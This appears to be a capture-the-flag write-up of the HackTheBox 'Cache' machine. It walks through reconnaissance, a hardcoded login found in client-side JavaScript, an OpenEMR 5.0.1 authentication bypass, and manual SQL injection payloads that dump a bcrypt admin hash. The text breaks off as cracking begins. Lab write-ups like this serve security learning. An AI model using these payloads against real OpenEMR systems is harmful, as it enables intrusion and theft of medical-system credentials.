@@ -1,0 +1,751 @@
+I"�<blockquote>
+  <p>Cache was a fun box, Initial web enumeration leads us to hardcoded credentials stored inside simple login page which uses client side validation, then discover a new VHost running a vulnerable instance of OpenEMR application. Exploitation chain of this application involves bypassing authentication allowing us to access a page vulnerable to SQL injection, We’ll perform SQL injection attack manually to dump hashes from the database. Next, We’ll use an OpenEMR Authenticated Remote Code Execution exploit to drop us a shell on the box, then pivot to another user using the credentials obtained from hardcoded website. Later we’ll access a Memcached service holding credentials of another user, dump them and escalate to next user. Leveraging the docker membership of the user we’ll elevate privileges to root.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>Beginning with <code class="language-plaintext highlighter-rouge">masscan</code> to find out open tcp and udp ports and piping it to <code class="language-plaintext highlighter-rouge">tee</code> to store the output in a file :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span>,U:1-65535 10.10.10.188 <span class="nt">--rate</span> 500 | <span class="nb">tee </span>masscan.ports
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-10-13 10:25:16 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>131070 ports/host]
+Discovered open port 80/tcp on 10.10.10.188
+Discovered open port 22/tcp on 10.10.10.188
+</code></pre></div></div>
+
+<p>Using <code class="language-plaintext highlighter-rouge">awk</code> and <code class="language-plaintext highlighter-rouge">sed</code> to filter out port numbers from output:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ <span class="nb">cat </span>masscan.ports | <span class="nb">grep </span>tcp
+Discovered open port 80/tcp on 10.10.10.188
+Discovered open port 22/tcp on 10.10.10.188
+
+cfx:  ~/Documents/htb/cache
+→ <span class="nb">cat </span>masscan.ports | <span class="nb">grep </span>tcp | <span class="nb">sed</span> <span class="s1">'s/Discovered open port //'</span> | <span class="nb">awk</span> <span class="nt">-F</span>/ <span class="s1">'{print $1}'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">','</span>
+80,22,
+</code></pre></div></div>
+<p>Ports 22, 80 were discovered from masscan, running <code class="language-plaintext highlighter-rouge">nmap</code> scan to discover services running on these ports :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span>,22 10.10.10.188
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-13 16:19 IST
+Nmap scan report <span class="k">for </span>10.10.10.188
+Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Cache
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.93 seconds
+</code></pre></div></div>
+
+<p>Apart from Apache version and webpage title we don’t find anything interesting from nmap scan.</p>
+
+<h3 id="port-80---http">Port 80 - HTTP</h3>
+
+<h4 id="cachehtb">Cache.htb</h4>
+
+<p>On visiting <a href="http://10.10.10.188">http://10.10.10.188</a> we see a very old school static website displaying information on Hacking and Hackers :</p>
+
+<p><img src="/assets/Cache/website.png" alt="website" /></p>
+
+<p>Before going forward with our enumeration we’ll fuzz out directories using <code class="language-plaintext highlighter-rouge">ffuf</code> and include <code class="language-plaintext highlighter-rouge">.html &amp; .txt</code>  extension :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ ffuf <span class="nt">-r</span> <span class="nt">-c</span> <span class="nt">-u</span> http://10.10.10.188/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt <span class="nt">-e</span> .txt,.html <span class="nt">-fc</span> 403
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.188/FUZZ
+ :: Extensions       : .txt .html
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+login.html              [Status: 200, Size: 2421, Words: 389, Lines: 106]
+news.html               [Status: 200, Size: 7231, Words: 948, Lines: 100]
+author.html             [Status: 200, Size: 1522, Words: 180, Lines: 68]
+index.html              [Status: 200, Size: 8193, Words: 902, Lines: 339]
+jquery                  [Status: 200, Size: 954, Words: 65, Lines: 17]
+contactus.html          [Status: 200, Size: 2539, Words: 283, Lines: 148]
+net.html                [Status: 200, Size: 290, Words: 23, Lines: 19]
+:: Progress: [60348/60348] :: Job [1/1] :: 180 req/sec :: Duration: [0:05:35] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<h4 id="loginhtml">login.html</h4>
+
+<p>Visiting <a href="http://10.10.10.188/login.html">http://10.10.10.188/login.html</a> exposes a login form:</p>
+
+<p><img src="/assets/Cache/login.png" alt="login" /></p>
+
+<p>I tried admin:admin creds which failed and we get two errors popped up:</p>
+
+<p><img src="/assets/Cache/error1.png" alt="error1" /></p>
+
+<p><img src="/assets/Cache/error2.png" alt="error2" /></p>
+
+<p>This odd behaviour of login form first displaying <strong>Password didn’t Match</strong> and later <strong>Username didn’t Match</strong> made me wonder how is it verifying credentials, So I checked the source of the page where I saw three JavaScript’s out of which two are web sourced but the script showcasing <code class="language-plaintext highlighter-rouge">functionality.js</code> is hosted on the box inside <code class="language-plaintext highlighter-rouge">jquery</code> directory, also <code class="language-plaintext highlighter-rouge">jquery</code> directory visible in <code class="language-plaintext highlighter-rouge">ffuf</code> output.</p>
+
+<p><img src="/assets/Cache/js.png" alt="js" /></p>
+
+<h4 id="functionalityjs">functionality.js</h4>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+
+    <span class="kd">var</span> <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+
+    <span class="kd">function</span> <span class="nx">checkCorrectPassword</span><span class="p">(){</span>
+        <span class="kd">var</span> <span class="nx">Password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#password</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">Password</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">H@v3_fun</span><span class="dl">'</span><span class="p">){</span>
+            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Password didn't Match</span><span class="dl">"</span><span class="p">);</span>
+            <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nx">checkCorrectUsername</span><span class="p">(){</span>
+        <span class="kd">var</span> <span class="nx">Username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#username</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">Username</span> <span class="o">!=</span> <span class="dl">"</span><span class="s2">ash</span><span class="dl">"</span><span class="p">){</span>
+            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Username didn't Match</span><span class="dl">"</span><span class="p">);</span>
+            <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#loginform</span><span class="dl">"</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+        <span class="cm">/* Act on the event */</span>
+        <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+         <span class="nx">checkCorrectPassword</span><span class="p">();</span>
+         <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+         <span class="nx">checkCorrectUsername</span><span class="p">();</span>
+
+
+        <span class="k">if</span><span class="p">(</span><span class="nx">error_correctPassword</span> <span class="o">==</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nx">error_username</span> <span class="o">==</span><span class="kc">false</span><span class="p">){</span>
+            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+
+<span class="p">});</span>
+</code></pre></div></div>
+<p>This client side JavaScript uses hardcoded credentials <code class="language-plaintext highlighter-rouge">ash:H@v3_fun</code> for authentication.</p>
+
+<p>Successful logging in leads us to the following page where we see a picture of <strong>ACE</strong>, a character from One piece anime :</p>
+
+<p><img src="/assets/Cache/website1.png" alt="website1" /></p>
+
+<p>Apparently, we are not getting anything useful out of these credentials so we’ll just keep them handy for later and move forward.</p>
+
+<h4 id="authorhtml">author.html</h4>
+
+<p>Heading on to <a href="http://10.10.10.188/author.html">http://10.10.10.188/author.html</a> we have the following page displaying some information about ash :</p>
+
+<p><img src="/assets/Cache/author.png" alt="author" /></p>
+
+<p>Interestingly, last line reveals there is another project similar to cache named <code class="language-plaintext highlighter-rouge">HMS (Hospital Management System)</code>.</p>
+
+<h3 id="vhost-enumeration">VHOST Enumeration</h3>
+
+<p>First thought comes in mind to enumerate subdomains trying <code class="language-plaintext highlighter-rouge">hms.cache.htb</code> but unfortunately it didn’t work. So I decided to fuzz domains thinking maybe <code class="language-plaintext highlighter-rouge">$VHOST.htb</code> is used instead of <code class="language-plaintext highlighter-rouge">$VHOST.cache.htb</code> :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ ffuf <span class="nt">-r</span> <span class="nt">-c</span> <span class="nt">-u</span> http://10.10.10.188 <span class="nt">-H</span> <span class="s1">'Host:FUZZ.htb'</span> <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-fl</span> 339
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.188
+ :: Header           : Host: FUZZ.htb
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response lines: 339
+________________________________________________
+
+hms                     [Status: 200, Size: 6061, Words: 1620, Lines: 118]
+:: Progress: [19983/19983] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:51] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>Bingo ! It worked, So I added <code class="language-plaintext highlighter-rouge">hms.htb</code> inside <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<h3 id="hms-website">HMS Website</h3>
+
+<p>On accessing <code class="language-plaintext highlighter-rouge">http://hms.htb</code> we get redirected to <code class="language-plaintext highlighter-rouge">http://hms.htb/interface/login/login.php?site=default</code> a login page running OpenEMR.</p>
+
+<blockquote>
+  <p>OpenEMR is a medical practice management software which also supports Electronic Medical Records.</p>
+</blockquote>
+
+<p><img src="/assets/Cache/hms.png" alt="hms" /></p>
+
+<p>I tried <code class="language-plaintext highlighter-rouge">ash</code> creds discovered earlier but it didn’t work.</p>
+
+<h4 id="fuzzing-the-website">Fuzzing the website</h4>
+
+<p>To fuzz the website I included <code class="language-plaintext highlighter-rouge">.php</code> extension since the redirected site had login.php :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ ffuf <span class="nt">-r</span> <span class="nt">-c</span> <span class="nt">-u</span> http://hms.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt <span class="nt">-e</span> .txt,.php <span class="nt">-fc</span> 403
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://hms.htb/FUZZ
+ :: Extensions       : .txt .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+sites                   [Status: 200, Size: 930, Words: 64, Lines: 17]
+config                  [Status: 200, Size: 1144, Words: 77, Lines: 18]
+common                  [Status: 200, Size: 1720, Words: 112, Lines: 21]
+admin.php               [Status: 200, Size: 937, Words: 69, Lines: 36]
+modules                 [Status: 200, Size: 956, Words: 64, Lines: 17]
+templates               [Status: 200, Size: 3404, Words: 208, Lines: 29]
+images                  [Status: 200, Size: 8498, Words: 435, Lines: 54]
+public                  [Status: 200, Size: 1316, Words: 88, Lines: 19]
+library                 [Status: 200, Size: 24528, Words: 1444, Lines: 129]
+services                [Status: 200, Size: 2285, Words: 137, Lines: 23]
+index.php               [Status: 200, Size: 6061, Words: 1620, Lines: 118]
+contrib                 [Status: 200, Size: 2688, Words: 172, Lines: 26]
+portal                  [Status: 200, Size: 9097, Words: 2866, Lines: 207]
+sql                     [Status: 200, Size: 9642, Words: 538, Lines: 55]
+setup.php               [Status: 200, Size: 1214, Words: 167, Lines: 16]
+custom                  [Status: 200, Size: 5090, Words: 288, Lines: 36]
+tests                   [Status: 200, Size: 1516, Words: 98, Lines: 20]
+Documentation           [Status: 200, Size: 4204, Words: 233, Lines: 31]
+controllers             [Status: 200, Size: 3265, Words: 186, Lines: 27]
+interface               [Status: 200, Size: 37, Words: 7, Lines: 1]
+vendor                  [Status: 200, Size: 7249, Words: 449, Lines: 49]
+controller.php          [Status: 200, Size: 37, Words: 7, Lines: 1]
+ci                      [Status: 200, Size: 1531, Words: 98, Lines: 20]
+version.php             [Status: 200, Size: 0, Words: 1, Lines: 1]
+LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675]
+cloud                   [Status: 200, Size: 930, Words: 61, Lines: 17]
+patients                [Status: 200, Size: 28, Words: 5, Lines: 1]
+repositories            [Status: 200, Size: 1887, Words: 112, Lines: 21]
+myportal                [Status: 200, Size: 28, Words: 4, Lines: 1]
+entities                [Status: 200, Size: 1779, Words: 113, Lines: 21]
+:: Progress: [60348/60348] :: Job [1/1] :: 180 req/sec :: Duration: [0:05:34] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>Looking at the output there are multiple exposed directories but first I went to <code class="language-plaintext highlighter-rouge">admin.php</code> located on <a href="http://hms.htb/admin.php">http://hms.htb/admin.php</a> which returns Version of <code class="language-plaintext highlighter-rouge">OpenEMR as 5.0.1(3)</code>, DB name as <code class="language-plaintext highlighter-rouge">openemr</code> and Site ID.</p>
+
+<p><img src="/assets/Cache/admin.png" alt="admin" /></p>
+
+<h3 id="openemr-vulnerabilities">OpenEMR Vulnerabilities</h3>
+
+<p>A quick google search brings us to this <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf"><strong>Vulnerabity report by Project Insecurity</strong></a> for OpenEMR 5.0.1.3 (same as ours) explaining many different types of vulnerabilities.</p>
+
+<h4 id="information-disclosure">Information Disclosure</h4>
+
+<p>As per section 4 of the <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf"><strong>vulnerability report</strong></a> the instance has three different <code class="language-plaintext highlighter-rouge">Unauthenticated Information Disclosure</code> one of the them is <code class="language-plaintext highlighter-rouge">admin.php</code> which we found earlier during our fuzzing, another file which is leaking info is located at <code class="language-plaintext highlighter-rouge">http://hms.htb/sql_patch.php</code>, looking at both the file we can confirm the following details:</p>
+
+<p><img src="/assets/Cache/sqlpatch.png" alt="sqlpatch" /></p>
+
+<ul>
+  <li>Version: 5.0.1(3)</li>
+  <li>DB name: openemr</li>
+</ul>
+
+<h2 id="sql-injection---openemr">SQL Injection - OpenEMR</h2>
+
+<p>Going through the <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf"><strong>report</strong></a> we understand the software has its fair share of SQL injection vulnerabilities.</p>
+
+<p>To perform SQL injection we’ll make use of following sections from the report :</p>
+
+<p><img src="/assets/Cache/sec2.png" alt="sec2" /></p>
+
+<p><img src="/assets/Cache/sec3.2.png" alt="sec3.2" /></p>
+
+<h4 id="key-points">Key Points</h4>
+
+<ul>
+  <li>
+    <p>In Section 2, it is highlighted that for some pages inside portal directory are accessible after browsing to the registration page, first one is <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code></p>
+  </li>
+  <li>
+    <p>Authentication can be bypassed by visiting registration page is located at <a href="http://hms.htb/portal/account/register.php/">http://hms.htb/portal/account/register.php/</a></p>
+  </li>
+  <li>
+    <p>Inside Section 3.2, we see <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code> is vulnerable to SQL injection</p>
+  </li>
+  <li>
+    <p>SQLi vulnerable page located at <a href="http://hms.htb/portal/add_edit_event_user.php">http://hms.htb/portal/add_edit_event_user.php</a></p>
+  </li>
+</ul>
+
+<h3 id="authentication-bypass">Authentication Bypass</h3>
+
+<p>On visiting <a href="http://hms.htb/portal/add_edit_event_user.php">http://hms.htb/portal/add_edit_event_user.php</a> we are redirected to Patient portal login page with an error message :</p>
+
+<p><img src="/assets/Cache/portal.png" alt="portal" /></p>
+
+<p>As mentioned in Section 2 of the report, we can bypass this authentication by visiting <a href="http://hms.htb/portal/account/register.php/">http://hms.htb/portal/account/register.php/</a></p>
+
+<p><img src="/assets/Cache/register.png" alt="register" /></p>
+
+<p>Again visiting <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code> the page returns successfully, confirming we have bypassed the authentication :</p>
+
+<p><img src="/assets/Cache/bypass.png" alt="bypass" /></p>
+
+<h3 id="confirming-sqli">Confirming SQLi</h3>
+
+<p>Now that we have bypassed the authentication we can look at the PoC of SQL injection for <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code></p>
+
+<p>Proof of Concept:
+<code class="language-plaintext highlighter-rouge">http://host/openemr/portal/add_edit_event_user.php?eid=​1 ANDEXTRACTVALUE(0,CONCAT(0x5c,VERSION()))</code></p>
+
+<p>On visiting <code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1%20AND%20EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))</code> we see the following Query error returned:</p>
+
+<p><img src="/assets/Cache/query.png" alt="query" /></p>
+
+<p>The query which we sent as per PoC errors but we can see the result of <code class="language-plaintext highlighter-rouge">VERSION()</code> as <code class="language-plaintext highlighter-rouge">5.7.30-0ubuntu0.18.04.1</code> in the message which confirms it’s an error based SQLi.</p>
+
+<h3 id="manual-sqli">Manual SQLi</h3>
+
+<p>It’s easier to perform this SQLi using <code class="language-plaintext highlighter-rouge">sqlmap</code> by changing the query to <code class="language-plaintext highlighter-rouge">eid=1</code> inside burp and capture the request along with cookies required for authentication and send it to sqlmap for auto exploitation but instead we’ll perform it manually to understand it better.</p>
+
+<p>Important Note: While performing SQLi if the session timeouts, we need to reload <code class="language-plaintext highlighter-rouge">register.php</code> page, intercept the request and replace the older cookies with new one.</p>
+
+<h4 id="step-1-testing-sqli">Step 1: Testing SQLi</h4>
+
+<p>We’ll begin by first testing the SQLi by sending <code class="language-plaintext highlighter-rouge">eid=1</code> and see the response :</p>
+
+<p><img src="/assets/Cache/burp.png" alt="burp" /></p>
+
+<p>Looking at the response, we are getting some kind of SQL syntax error, confirming we have some kind of SQL injection</p>
+
+<h4 id="step-2-finding-fields">Step 2: Finding fields</h4>
+
+<p>Now, let’s make use of <code class="language-plaintext highlighter-rouge">ORDER BY</code> SQL query to find out how many fields are inside this sql query:</p>
+
+<p>We’ll send order by command and increment the value by 1 until we see an change in the result</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 order by 1
+/portal/add_edit_event_user.php?eid=1 order by 2
+/portal/add_edit_event_user.php?eid=1 order by 3
+/portal/add_edit_event_user.php?eid=1 order by 4
+</span></code></pre></div></div>
+<p>Till <code class="language-plaintext highlighter-rouge">eid=1 order by 4 </code> we don’t see any change in the result but on sending <code class="language-plaintext highlighter-rouge">eid=1 order by 5 </code> a new error is returned as <code class="language-plaintext highlighter-rouge">Unknown column '5' in 'order clause'</code> :</p>
+
+<p><img src="/assets/Cache/order.png" alt="order" /></p>
+
+<p>This indicates we have 4 fields inside the SQL Query, which we’ll use to draft our next query.</p>
+
+<h4 id="step-3-sql-injection-enumeration">Step 3: SQL Injection Enumeration</h4>
+
+<p>We’ll use <strong>UNION SELECT</strong> to combine our select statement results and find out version of the box by sending <code class="language-plaintext highlighter-rouge">VERSION()</code> inside our query, add <code class="language-plaintext highlighter-rouge">null</code> parameter for all four fields. I tried injecting version() inside all four but only third field returned the query result :</p>
+
+<p><img src="/assets/Cache/select.png" alt="select" /></p>
+
+<p>Next, let’s enumerate Database name</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,database(),null HTTP/1.1
+</span></code></pre></div></div>
+
+<p>We can see our query resulted with database name as <code class="language-plaintext highlighter-rouge">openemr</code></p>
+
+<p><img src="/assets/Cache/database.png" alt="database" /></p>
+
+<p>Next, let’s get the user which is running the queries on this SQL server.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,user(),null
+</span></code></pre></div></div>
+
+<p><img src="/assets/Cache/user.png" alt="user" /></p>
+
+<p>The user is <code class="language-plaintext highlighter-rouge">openemr@localhost</code></p>
+
+<p>Great! Now that our statement is working we can hop on to the next level to enumerate</p>
+
+<h4 id="step-4-enumerating-tables">Step 4: Enumerating Tables</h4>
+
+<p>Since, we already know we are running inside <code class="language-plaintext highlighter-rouge">openemr</code> database, Let’s try to get the list of tables under this database:</p>
+
+<p>To understand Information scheme tables in details we can refer this <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html"><strong>page</strong></a></p>
+
+<blockquote>
+  <p>TABLE_SCHEMA: The name of the schema (database) to which the table belongs.</p>
+</blockquote>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,CONCAT(table_name),null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='openemr'
+</span></code></pre></div></div>
+
+<p><img src="/assets/Cache/table.png" alt="table" /></p>
+
+<p>Looking at the result we see only one table entry, let reform our query by adding <code class="language-plaintext highlighter-rouge">group_concat</code> to the statement</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,GROUP_CONCAT(table_name),null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='openemr'
+</span></code></pre></div></div>
+
+<p><img src="/assets/Cache/table2.png" alt="table2" /></p>
+
+<p>We got the list of tables inside openemr database, but the result looks incomplete probably there is some kind of limit on how many field can be shown.</p>
+
+<p>Let’s again refine our query to look for something interesting like users table</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,GROUP_CONCAT(table_name),null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='openemr' AND TABLE_NAME like 'user%'
+</span></code></pre></div></div>
+<p><img src="/assets/Cache/table3.png" alt="table3" /></p>
+
+<p>Bingo! Two interesting tables are <code class="language-plaintext highlighter-rouge">users</code> &amp; <code class="language-plaintext highlighter-rouge">users_secure</code></p>
+
+<h3 id="extracting-credentials">Extracting Credentials</h3>
+
+<h4 id="step-5-enumerating-users--users_secure-table">Step 5: Enumerating users &amp; users_secure table</h4>
+
+<p>First, we’ll enumerate users table by finding out columns inside it :</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,group_concat(column_name),null FROM INFORMATION_SCHEMA.columns WHERE TABLE_SCHEMA='openemr' AND TABLE_NAME='users'
+</span></code></pre></div></div>
+<p><img src="/assets/Cache/usertable.png" alt="usertable" /></p>
+
+<p>We have username and password columns which are useful to us, let’s take a look at them :</p>
+
+<p>Since we already know we are under <code class="language-plaintext highlighter-rouge">openemr</code> database, we don’t need to mention it again, If in case there were multiple databases running on this server we would have specified database name by <code class="language-plaintext highlighter-rouge">openemr.users</code></p>
+
+<p>We will be using concatenating three field where <code class="language-plaintext highlighter-rouge">0x3A is a colon (:) in hex</code> so our output will be in the form <code class="language-plaintext highlighter-rouge">username:password</code></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 union select null,null,group_concat(username,0x3a,password),NULL from users
+</span></code></pre></div></div>
+<p><img src="/assets/Cache/usertable1.png" alt="usertable1" /></p>
+
+<p>Doesn’t look like we have any password, let’s try the similar query for <code class="language-plaintext highlighter-rouge">users_secure</code> table:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/portal/add_edit_event_user.php?eid=1 union select null,null,group_concat(username,0x3a,password),NULL from users_secure
+</span></code></pre></div></div>
+<p><img src="/assets/Cache/usersecure.png" alt="usersecure" /></p>
+
+<p>Great! We have a username and its hash <code class="language-plaintext highlighter-rouge">openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.</code>, let’s crack it using john.</p>
+
+<h3 id="cracking-hashes">Cracking hashes</h3>
+
+<p>Before cracking the hash let’s check it’s format using <code class="language-plaintext highlighter-rouge">hashid</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ hashid <span class="nt">-j</span> <span class="s1">'$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'</span>
+Analyzing <span class="s1">'$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'</span>
+<span class="o">[</span>+] Blowfish<span class="o">(</span>OpenBSD<span class="o">)</span> <span class="o">[</span>JtR Format: bcrypt]
+<span class="o">[</span>+] Woltlab Burning Board 4.x
+<span class="o">[</span>+] bcrypt <span class="o">[</span>JtR Format: bcrypt]
+</code></pre></div></div>
+<p>Hash Format for John is <code class="language-plaintext highlighter-rouge">bcrypt</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ <span class="nb">cat </span>openemr_admin.hash
